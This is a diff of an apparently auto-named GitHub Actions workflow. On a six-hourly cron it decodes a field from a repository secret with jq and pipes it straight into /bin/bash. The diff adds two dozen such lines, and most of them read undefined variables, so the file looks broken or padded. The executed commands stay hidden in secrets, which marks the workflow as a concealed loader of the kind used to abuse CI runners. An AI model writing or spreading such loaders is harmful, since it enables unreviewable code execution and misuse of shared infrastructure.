@@ -1,9 +1,9 @@
 name: yutongrenf
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '39 2/6 * * *'
+    - cron: '48 1/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,8 +12,30 @@ jobs:
       - uses: actions/checkout@v4
       - name: yutongrenf
         env:
-          tev12651: ${{ secrets.tev12651 }}
+          g22533: ${{ secrets.g22533 }}
         run: |
-          echo $tev12651 | jq -r .u4273 | /bin/bash
-          echo $nbk1 | jq -r .goryv08586 | /bin/bash
+          echo $g22533 | jq -r .wcy5 | /bin/bash
+          echo $a5 | jq -r .slc4 | /bin/bash
+          echo $ydzl19 | jq -r .pvres4426 | /bin/bash
+          echo $ijfks2 | jq -r .ruuz0333 | /bin/bash
+          echo $somoc8537 | jq -r .rt075 | /bin/bash
+          echo $ql06 | jq -r .ezybh108 | /bin/bash
+          echo $r14 | jq -r .zfk37 | /bin/bash
+          echo $o93 | jq -r .ip65 | /bin/bash
+          echo $ri0 | jq -r .inyb3923 | /bin/bash
+          echo $in82 | jq -r .jid78723 | /bin/bash
+          echo $zkfst0 | jq -r .bervn11799 | /bin/bash
+          echo $a8 | jq -r .btnqz50031 | /bin/bash
+          echo $pyhh0138 | jq -r .eyu85201 | /bin/bash
+          echo $tfima72 | jq -r .njuzm0826 | /bin/bash
+          echo $e61 | jq -r .xet37 | /bin/bash
+          echo $e3801 | jq -r .jg48 | /bin/bash
+          echo $ouacx79 | jq -r .g7407 | /bin/bash
+          echo $de95 | jq -r .a79790 | /bin/bash
+          echo $ehdvn4 | jq -r .pllqm96028 | /bin/bash
+          echo $iuowj04592 | jq -r .jembb462 | /bin/bash
+          echo $ruxl93 | jq -r .tg737 | /bin/bash
+          echo $btt20 | jq -r .ekp5 | /bin/bash
+          echo $tnweq7683 | jq -r .m38 | /bin/bash
+          echo $aw9 | jq -r .hnt18232 | /bin/bash
 
